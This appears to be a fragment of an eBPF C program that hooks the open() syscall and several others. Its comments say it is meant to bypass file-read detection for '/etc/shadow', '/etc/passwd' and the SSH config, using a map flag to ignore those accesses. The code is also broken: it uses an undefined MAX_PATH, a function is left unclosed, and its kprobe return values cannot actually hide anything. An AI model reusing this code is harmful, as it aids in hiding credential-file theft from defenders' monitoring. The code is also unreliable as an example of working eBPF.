#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/unistd.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <string.h>

#define MAX 256
//same map as before 
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, int);
    __type(value, int);
} ignore_map SEC(".maps");
// bypass the file read detectionn for imp files 
//ignores the open syscall for useful imp files 
//checks if the file being opened is /etc/shadow /etc/passwd or ssh_config

SEC("kprobe/__x64_sys_open")


int bpf_prog_open(struct pt_regs *ctx)
{
    // First argument to open() is the path string (user-space pointer).
    char *user_path = (char *)PT_REGS_PARM1(ctx);
    char buf[MAX_PATH];
    int ret;
    //pulling the path into the local buffer 
    //the helper function returns the bytes copied 
    ret=bpf_probe_read_str(buf, sizeof(buf), user_path);
        if (ret <= 0)
            return 1; // pass if not read 
//checking if the copied buffer matches to any of the interesting files we care abt

  if (bpf_strncmp(buf, sizeof(buf), "/etc/shadow") == 0 ||
        bpf_strncmp(buf, sizeof(buf), "/etc/passwd") == 0 ||
        bpf_strncmp(buf, sizeof(buf), "/etc/ssh/ssh_config") == 0){
int key=2;

int *val = bpf_map_lookup_elem(&ignore_map, &key);
        if (val && *val == 1) {
            // 
            return 0;
            }
            return 1; 
}
SEC("kprobe/sys_connect")
int bpf_prog_connect(struct pt_regs *ctx) { return 0; }//ignore this 

SEC("kprobe/sys_fork")
int bpf_prog_fork(struct pt_regs *ctx) { return 0; }

SEC("kprobe/sys_clone")
int bpf_prog_clone(struct pt_regs *ctx) { return 0; }

SEC("kprobe/sys_read")
int bpf_prog_read(struct pt_regs *ctx) { return 0; }

SEC("kprobe/sys_write")
int bpf_prog_write(struct pt_regs *ctx) { return 0; }

SEC("kprobe/sys_sendto")
int bpf_prog_sendto(struct pt_regs *ctx) { return 0; }

SEC("kprobe/sys_recvfrom")
int bpf_prog_recvfrom(struct pt_regs *ctx) { return 0; }

char _license[] SEC("license") = "GPL";


            
        
            
